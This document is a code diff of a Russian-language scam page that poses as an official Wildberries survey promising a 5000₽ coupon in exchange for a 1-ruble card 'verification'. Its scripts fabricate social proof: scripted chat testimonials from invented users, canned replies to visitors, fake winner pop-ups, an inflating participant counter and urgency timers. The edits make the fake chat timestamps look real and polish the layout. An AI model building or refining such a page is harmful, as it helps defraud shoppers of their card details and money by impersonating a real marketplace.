@@ -23,88 +23,70 @@
       justify-content: center;
     }
 
-    /* Контейнер опроса */
     .survey-container {
       max-width: 560px;
       width: 100%;
       margin: 0 auto;
     }
 
-    /* Карточка */
     .card {
       background: white;
       border-radius: 32px;
       overflow: hidden;
       box-shadow: 0 20px 40px -12px rgba(0, 0, 0, 0.15);
-      transition: transform 0.2s;
     }
 
-    /* Шапка с градиентом ВБ */
+    /* Шапка — исправлено: элементы не налезают */
     .hero-header {
       background: linear-gradient(135deg, #7B1FA2 0%, #E91E63 50%, #9C27B0 100%);
-      padding: 28px 24px;
+      padding: 32px 24px 24px;
       text-align: center;
       color: white;
       position: relative;
     }
 
     .official-badge {
-      position: absolute;
-      top: -12px;
-      left: 50%;
-      transform: translateX(-50%);
+      display: inline-block;
       background: linear-gradient(135deg, #FFD700, #FFA000);
       color: #1A1A1A;
-      padding: 6px 20px;
+      padding: 6px 18px;
       border-radius: 40px;
-      font-size: 12px;
+      font-size: 11px;
       font-weight: 800;
       letter-spacing: 0.5px;
-      white-space: nowrap;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.15);
+      margin-bottom: 18px;
     }
 
     .hero-header h1 {
       font-size: 24px;
       font-weight: 800;
-      margin-bottom: 8px;
+      margin-bottom: 10px;
       line-height: 1.3;
     }
 
     .hero-header p {
       font-size: 14px;
       opacity: 0.95;
-      margin-bottom: 16px;
+      margin-bottom: 20px;
     }
 
     .stats-row {
       display: flex;
-      justify-content: space-between;
-      align-items: center;
+      justify-content: center;
+      gap: 16px;
       flex-wrap: wrap;
-      gap: 12px;
-      margin-top: 8px;
     }
 
-    .timer-badge {
-      background: rgba(255,255,255,0.2);
+    .timer-badge, .participants-badge {
+      background: rgba(255,255,255,0.18);
       backdrop-filter: blur(4px);
-      padding: 8px 16px;
+      padding: 8px 18px;
       border-radius: 40px;
       font-size: 13px;
       font-weight: 600;
       display: inline-flex;
       align-items: center;
       gap: 6px;
-    }
-
-    .participants-badge {
-      background: rgba(255,255,255,0.15);
-      backdrop-filter: blur(4px);
-      padding: 8px 16px;
-      border-radius: 40px;
-      font-size: 13px;
-      font-weight: 500;
     }
 
     .limited-offer {
@@ -121,7 +103,6 @@
       gap: 8px;
     }
 
-    /* Прогресс-бар */
     .progress-section {
       padding: 20px 24px 0;
     }
@@ -148,7 +129,6 @@
       transition: width 0.4s ease;
     }
 
-    /* Вопросы */
     .questions-area {
       padding: 8px 24px;
     }
@@ -204,7 +184,6 @@
       transform: translateX(4px);
     }
 
-    /* Лоадер */
     .loader-area {
       padding: 40px 24px;
       text-align: center;
@@ -247,7 +226,6 @@
       border-left: 3px solid #7B1FA2;
     }
 
-    /* Финальная страница */
     .final-area {
       padding: 24px;
       text-align: center;
@@ -323,7 +301,6 @@
       50% { transform: scale(1.02); }
     }
 
-    /* Чат */
     .chat-widget {
       margin: 20px 20px 24px;
       background: #FAFAFE;
@@ -454,12 +431,12 @@
       cursor: pointer;
     }
 
-    /* Всплывающие уведомления */
+    /* Уведомления — вверху */
     .floating-notification {
       position: fixed;
-      bottom: 20px;
-      left: 20px;
+      top: 20px;
       right: 20px;
+      left: auto;
       max-width: 340px;
       background: white;
       border-radius: 16px;
@@ -467,17 +444,17 @@
       box-shadow: 0 8px 24px rgba(0,0,0,0.15);
       border-left: 4px solid #7B1FA2;
       z-index: 1000;
-      animation: slideUp 0.4s ease;
-    }
-
-    @keyframes slideUp {
-      from { transform: translateY(100px); opacity: 0; }
-      to { transform: translateY(0); opacity: 1; }
+      animation: slideDown 0.4s ease;
     }
 
     @keyframes slideDown {
+      from { transform: translateY(-100px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+
+    @keyframes slideUp {
       from { transform: translateY(0); opacity: 1; }
-      to { transform: translateY(100px); opacity: 0; }
+      to { transform: translateY(-100px); opacity: 0; }
     }
 
     .notification-content {
@@ -498,14 +475,15 @@
       font-weight: 800;
     }
 
-    /* Адаптив */
     @media (max-width: 480px) {
       body { padding: 12px; }
       .hero-header h1 { font-size: 20px; }
       .question h3 { font-size: 18px; }
       .gift-amount { font-size: 44px; }
       .btn-claim { padding: 15px 20px; font-size: 16px; }
-      .floating-notification { left: 12px; right: 12px; max-width: none; }
+      .floating-notification { right: 12px; left: auto; max-width: 300px; }
+      .stats-row { gap: 10px; }
+      .timer-badge, .participants-badge { padding: 6px 14px; font-size: 12px; }
     }
   </style>
 </head>
@@ -513,9 +491,9 @@
 
 <div class="survey-container">
   <div class="card">
-    <!-- Шапка -->
+    <!-- Шапка — исправлено: отступы, элементы не налезают -->
     <div class="hero-header">
-      <div class="official-badge">⚡ ОФИЦИАЛЬНЫЙ ОПРОС ВБ ⚡</div>
+      <div class="official-badge">⚡ ОФИЦИАЛЬНЫЙ ОПРОС ВБ</div>
       <h1>🎁 ПОЛУЧИТЕ КУПОН НА 5000₽</h1>
       <p>Пройдите опрос — и мы покажем, как активировать подарок</p>
       <div class="stats-row">
@@ -528,7 +506,6 @@
       🔥 <strong>Ограниченное предложение!</strong> Ссылка активна 24 часа. Успейте!
     </div>
 
-    <!-- Прогресс -->
     <div class="progress-section">
       <div class="progress-label">Вопрос <span id="currentQ">1</span> из 7</div>
       <div class="progress-bar-bg">
@@ -536,7 +513,6 @@
       </div>
     </div>
 
-    <!-- Вопросы -->
     <div class="questions-area" id="questionsArea">
       <div class="question active" data-q="1">
         <h3>Как часто вы совершаете покупки на WildBerries?</h3>
@@ -594,7 +570,6 @@
       </div>
     </div>
 
-    <!-- Лоадер -->
     <div class="loader-area" id="loaderArea">
       <div class="spinner"></div>
       <p style="font-weight: 600; margin-bottom: 16px;">Проверяем ваши ответы...</p>
@@ -603,7 +578,6 @@
       <div class="loading-step" id="step3">⏳ Подготовка купона...</div>
     </div>
 
-    <!-- Финальная страница -->
     <div class="final-area" id="finalArea">
       <h2>🎉 Поздравляем!</h2>
       <p>Вы прошли опрос и получаете право на</p>
@@ -629,7 +603,6 @@
       <p style="font-size: 12px; color: #888;">*Оплата 1 рубля нужна для верификации. Средства возвращаются на счёт.</p>
     </div>
 
-    <!-- Чат -->
     <div class="chat-widget">
       <div class="chat-header">
         <span>💬 Чат участников розыгрыша</span>
@@ -651,39 +624,39 @@
   let participants = 1847;
   let isSurveyActive = true;
 
-  // Таймеры
   let mainSeconds = 23 * 3600 + 24 * 60 + 59;
-  let finalSeconds = 300; // 5 минут
+  let finalSeconds = 300;
 
-  // Уведомления
   let notificationQueue = [];
   let isShowingNotif = false;
 
-  // Чат
-  let messageId = 0;
+  // Чат с правильной временной логикой
+  let lastMessageTime = new Date();
+  let messageInterval = null;
+  
   const femaleNames = ["Анна", "Марина", "Ольга", "Елена", "Ирина", "Светлана", "Наталья", "Юлия", "Татьяна", "Виктория", "Екатерина", "Мария"];
   const maleNames = ["Сергей", "Дмитрий", "Александр", "Андрей", "Максим", "Алексей", "Иван", "Михаил", "Роман", "Павел"];
   const cities = ["Москва", "СПб", "Казань", "Новосибирск", "Екатеринбург", "Краснодар", "Сочи", "Воронеж", "Самара", "Уфа"];
   
   const chatMessagesList = [
-    {name: "Анна_Москва", text: "Девочки, только что получила 5000₽ на карту! Всё работает!", time: "10:15", gender: "female"},
-    {name: "Сергей_Т", text: "Кто уже прошел верификацию? Долго ждать?", time: "10:18", gender: "male"},
-    {name: "Ольга_Премиум", text: "Я за 5 минут получила! Главное — не бояться рубля, его сразу возвращают", time: "10:22", gender: "female"},
-    {name: "Марина_Шопер", text: "Уже потратила на новое платье! Спасибо ВБ 😍", time: "10:25", gender: "female"},
-    {name: "Дмитрий_К", text: "Жена не верила, пока сама не попробовала. Теперь оба довольны!", time: "10:28", gender: "male"},
-    {name: "Елена_Счастливая", text: "Верификацию прошла легко, просто заполнила данные. Деньги пришли через 3 минуты", time: "10:32", gender: "female"},
-    {name: "Наталья_К", text: "Только что привязала карту, списали 1 рубль и сразу вернули. Теперь жду 5000₽", time: "10:45", gender: "female"},
-    {name: "Александр_В", text: "Подтверждаю, с картой Тинькофф всё прошло без проблем", time: "10:38", gender: "male"},
-    {name: "Светлана_Золото", text: "Не слушайте скептиков! Это официальный розыгрыш от ВБ", time: "10:42", gender: "female"},
-    {name: "Виктория_Модница", text: "У меня через 2 минуты пришло. Главное — всё правильно заполнить", time: "10:52", gender: "female"},
-    {name: "Татьяна_Про", text: "Подарков реально мало осталось, торопитесь!", time: "10:55", gender: "female"},
-    {name: "Максим_СПб", text: "Сначала думал лохотрон, но жена уговорила попробовать. Не зря!", time: "10:58", gender: "male"},
-    {name: "Юлия_Красота", text: "Уже получила и потратила на косметику! Всё работает 💄", time: "11:02", gender: "female"},
-    {name: "Людмила_Шоппинг", text: "Девочки, не бойтесь рубля! Это просто проверка карты", time: "11:08", gender: "female"},
-    {name: "Алиса_Стильная", text: "У меня 7 минут было. Подождите немного", time: "11:15", gender: "female"},
-    {name: "Екатерина_Л", text: "Я купила детям одежду на осень. Очень кстати пришлись деньги", time: "11:22", gender: "female"},
-    {name: "Ирина_Казань", text: "А если карта не сбербанка? У меня ВТБ, тоже подойдет?", time: "10:35", gender: "female"},
-    {name: "Андрей_Новосиб", text: "Любая карта подходит, проверено!", time: "11:25", gender: "male"}
+    {name: "Анна_Москва", text: "Девочки, только что получила 5000₽ на карту! Всё работает!", gender: "female"},
+    {name: "Сергей_Т", text: "Кто уже прошел верификацию? Долго ждать?", gender: "male"},
+    {name: "Ольга_Премиум", text: "Я за 5 минут получила! Главное — не бояться рубля, его сразу возвращают", gender: "female"},
+    {name: "Марина_Шопер", text: "Уже потратила на новое платье! Спасибо ВБ 😍", gender: "female"},
+    {name: "Дмитрий_К", text: "Жена не верила, пока сама не попробовала. Теперь оба довольны!", gender: "male"},
+    {name: "Елена_Счастливая", text: "Верификацию прошла легко, просто заполнила данные. Деньги пришли через 3 минуты", gender: "female"},
+    {name: "Наталья_К", text: "Только что привязала карту, списали 1 рубль и сразу вернули. Теперь жду 5000₽", gender: "female"},
+    {name: "Александр_В", text: "Подтверждаю, с картой Тинькофф всё прошло без проблем", gender: "male"},
+    {name: "Светлана_Золото", text: "Не слушайте скептиков! Это официальный розыгрыш от ВБ", gender: "female"},
+    {name: "Виктория_Модница", text: "У меня через 2 минуты пришло. Главное — всё правильно заполнить", gender: "female"},
+    {name: "Татьяна_Про", text: "Подарков реально мало осталось, торопитесь!", gender: "female"},
+    {name: "Максим_СПб", text: "Сначала думал лохотрон, но жена уговорила попробовать. Не зря!", gender: "male"},
+    {name: "Юлия_Красота", text: "Уже получила и потратила на косметику! Всё работает 💄", gender: "female"},
+    {name: "Людмила_Шоппинг", text: "Девочки, не бойтесь рубля! Это просто проверка карты", gender: "female"},
+    {name: "Алиса_Стильная", text: "У меня 7 минут было. Подождите немного", gender: "female"},
+    {name: "Екатерина_Л", text: "Я купила детям одежду на осень. Очень кстати пришлись деньги", gender: "female"},
+    {name: "Ирина_Казань", text: "А если карта не сбербанка? У меня ВТБ, тоже подойдет?", gender: "female"},
+    {name: "Андрей_Новосиб", text: "Любая карта подходит, проверено!", gender: "male"}
   ];
 
   const randomPhrases = [
@@ -701,7 +674,7 @@
     updateProgress();
     startMainTimer();
     startParticipantsGrowth();
-    initChat();
+    initChatWithTimeline();
     initSurveyButtons();
     scheduleNotifications();
   }
@@ -728,7 +701,6 @@
     document.getElementById('questionsArea').style.display = 'none';
     document.getElementById('loaderArea').classList.add('active');
     
-    // Анимация шагов
     setTimeout(() => {
       document.getElementById('step2').classList.add('active');
     }, 1500);
@@ -748,7 +720,6 @@
     document.querySelectorAll('.option-btn').forEach(btn => {
       btn.addEventListener('click', (e) => {
         if (!isSurveyActive) return;
-        // Увеличиваем счётчик участников при каждом ответе
         participants += Math.floor(Math.random() * 2) + 1;
         document.getElementById('participantsCount').innerText = participants.toLocaleString();
         nextQuestion();
@@ -756,7 +727,6 @@
     });
   }
 
-  // Таймеры
   function startMainTimer() {
     const timerEl = document.getElementById('mainTimer');
     function update() {
@@ -799,7 +769,7 @@
     }, 8000);
   }
 
-  // Уведомления
+  // Уведомления вверху, реже (раз в 12-18 секунд)
   function createWinnerNotif() {
     const name = femaleNames[Math.floor(Math.random() * femaleNames.length)];
     const city = cities[Math.floor(Math.random() * cities.length)];
@@ -819,9 +789,9 @@
     `;
     document.body.appendChild(notif);
     setTimeout(() => {
-      notif.style.animation = 'slideDown 0.4s ease forwards';
+      notif.style.animation = 'slideUp 0.4s ease forwards';
       setTimeout(() => notif.remove(), 400);
-    }, 3500);
+    }, 4000);
   }
 
   function scheduleNotifications() {
@@ -830,7 +800,8 @@
     if (!isShowingNotif) {
       processQueue();
     }
-    setTimeout(scheduleNotifications, 5000 + Math.random() * 5000);
+    // Уведомления реже: 12-18 секунд
+    setTimeout(scheduleNotifications, 12000 + Math.random() * 6000);
   }
 
   function processQueue() {
@@ -843,40 +814,26 @@
     showFloatingNotification(notif);
     setTimeout(() => {
       processQueue();
-    }, 4000);
+    }, 5000);
   }
 
   function showSuccessNotif() {
     const notif = document.createElement('div');
     notif.className = 'floating-notification';
-    notif.style.bottom = 'auto';
-    notif.style.top = '20px';
-    notif.style.left = '50%';
-    notif.style.transform = 'translateX(-50%)';
-    notif.style.maxWidth = '300px';
     notif.innerHTML = `<div class="notification-content"><div class="wb-icon">✅</div><div>Вы успешно прошли опрос! 🎁</div></div>`;
     document.body.appendChild(notif);
     setTimeout(() => {
-      notif.style.animation = 'slideDown 0.4s ease forwards';
+      notif.style.animation = 'slideUp 0.4s ease forwards';
       setTimeout(() => notif.remove(), 400);
-    }, 3000);
+    }, 4000);
   }
 
-  // ЧАТ
-  function initChat() {
-    const container = document.getElementById('chatMessages');
-    chatMessagesList.forEach(msg => addChatMessage(msg.name, msg.text, msg.gender, msg.time, false));
-    
-    document.getElementById('chatSendBtn').addEventListener('click', sendUserMessage);
-    document.getElementById('chatInput').addEventListener('keypress', (e) => {
-      if (e.key === 'Enter') sendUserMessage();
-    });
-    
-    setInterval(() => addRandomChatMessage(), 10000 + Math.random() * 8000);
-    setInterval(updateOnlineCount, 15000);
+  // ЧАТ С ПРАВИЛЬНОЙ ВРЕМЕННОЙ ЛИНИЕЙ
+  function getFormattedTime() {
+    return new Date().toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit' });
   }
 
-  function addChatMessage(name, text, gender, time, isUser = false) {
+  function addChatMessage(name, text, gender, isUser = false) {
     const container = document.getElementById('chatMessages');
     const avatarLetter = name.split('_')[0].charAt(0);
     const msgDiv = document.createElement('div');
@@ -886,42 +843,106 @@
       <div class="bubble">
         <div class="message-name">${name}</div>
         <div>${text}</div>
-        <div class="message-time">${time}</div>
+        <div class="message-time">${getFormattedTime()}</div>
       </div>
     `;
     container.appendChild(msgDiv);
     container.scrollTop = container.scrollHeight;
-    // Ограничиваем историю
-    while (container.children.length > 25) container.removeChild(container.firstChild);
+    while (container.children.length > 30) container.removeChild(container.firstChild);
   }
 
-  function getCurrentTime() {
-    return new Date().toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit' });
+  // Функция для отображения сообщений с реалистичными временными метками
+  function displayMessageWithDelay(msg, delay) {
+    setTimeout(() => {
+      addChatMessage(msg.name, msg.text, msg.gender, false);
+      lastMessageTime = new Date();
+    }, delay);
   }
 
-  function addRandomChatMessage() {
-    const isFemale = Math.random() > 0.4;
-    const nameList = isFemale ? femaleNames : maleNames;
-    const name = nameList[Math.floor(Math.random() * nameList.length)];
-    const city = cities[Math.floor(Math.random() * cities.length)];
-    const fullName = `${name}_${city}`;
-    const text = randomPhrases[Math.floor(Math.random() * randomPhrases.length)];
-    const gender = isFemale ? 'female' : 'male';
-    addChatMessage(fullName, text, gender, getCurrentTime(), false);
+  function initChatWithTimeline() {
+    const container = document.getElementById('chatMessages');
+    container.innerHTML = '';
+    
+    // Берем последние 10 сообщений для показа
+    const recentMessages = chatMessagesList.slice(-10);
+    
+    // Рассчитываем временные интервалы: сообщения за последние 30 минут
+    const now = new Date();
+    const baseTime = new Date(now.getTime() - 30 * 60 * 1000); // 30 минут назад
+    
+    let currentDelay = 0;
+    
+    recentMessages.forEach((msg, index) => {
+      // Имитация: сообщения распределены равномерно по времени
+      const minutesOffset = (index / recentMessages.length) * 30; // от 0 до 30 минут
+      const msgTime = new Date(baseTime.getTime() + minutesOffset * 60 * 1000);
+      
+      // Рассчитываем задержку от текущего момента
+      let displayDelay = Math.max(0, msgTime.getTime() - now.getTime());
+      
+      if (displayDelay <= 0 && index === recentMessages.length - 1) {
+        // Если сообщение уже в прошлом, показываем сразу
+        displayDelay = 0;
+      }
+      
+      displayMessageWithDelay(msg, displayDelay);
+      currentDelay = displayDelay;
+    });
+    
+    // После загрузки истории запускаем генерацию новых сообщений
+    setTimeout(() => {
+      startNewMessagesGenerator();
+    }, currentDelay + 1000);
+    
+    // Настройка отправки сообщений от пользователя
+    document.getElementById('chatSendBtn').addEventListener('click', sendUserMessage);
+    document.getElementById('chatInput').addEventListener('keypress', (e) => {
+      if (e.key === 'Enter') sendUserMessage();
+    });
+    
+    // Обновление онлайн-счетчика
+    setInterval(updateOnlineCount, 15000);
+  }
+
+  function startNewMessagesGenerator() {
+    // Генерация новых сообщений каждые 15-45 секунд
+    if (messageInterval) clearInterval(messageInterval);
+    
+    function generateMessage() {
+      if (isSurveyActive || document.getElementById('finalArea').classList.contains('active')) {
+        const isFemale = Math.random() > 0.4;
+        const nameList = isFemale ? femaleNames : maleNames;
+        const name = nameList[Math.floor(Math.random() * nameList.length)];
+        const city = cities[Math.floor(Math.random() * cities.length)];
+        const fullName = `${name}_${city}`;
+        const text = randomPhrases[Math.floor(Math.random() * randomPhrases.length)];
+        const gender = isFemale ? 'female' : 'male';
+        addChatMessage(fullName, text, gender, false);
+      }
+      scheduleNextMessage();
+    }
+    
+    function scheduleNextMessage() {
+      const delay = 15000 + Math.random() * 30000; // 15-45 секунд
+      setTimeout(generateMessage, delay);
+    }
+    
+    scheduleNextMessage();
   }
 
   function sendUserMessage() {
     const input = document.getElementById('chatInput');
     const text = input.value.trim();
     if (!text) return;
-    addChatMessage('Вы', text, 'user', getCurrentTime(), true);
+    addChatMessage('Вы', text, 'user', true);
     input.value = '';
-    // Имитация ответа
+    
+    // Ответ через 3-7 секунд
     setTimeout(() => {
       const responses = ["Отлично! Удачи в розыгрыше! 🍀", "Скоро и вы получите свои 5000₽!", "Спасибо за участие!", "Успевайте, акция заканчивается!"];
       const reply = responses[Math.floor(Math.random() * responses.length)];
       const randName = femaleNames[Math.floor(Math.random() * femaleNames.length)] + "_" + cities[Math.floor(Math.random() * cities.length)];
-      addChatMessage(randName, reply, 'female', getCurrentTime(), false);
+      addChatMessage(randName, reply, 'female', false);
     }, 3000 + Math.random() * 4000);
   }
 
@@ -930,11 +951,9 @@
     document.getElementById('onlineCount').innerText = online;
   }
 
-  // Запуск
   init();
 </script>
 
-<!-- Google Analytics -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-WR5FDTDTNN"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
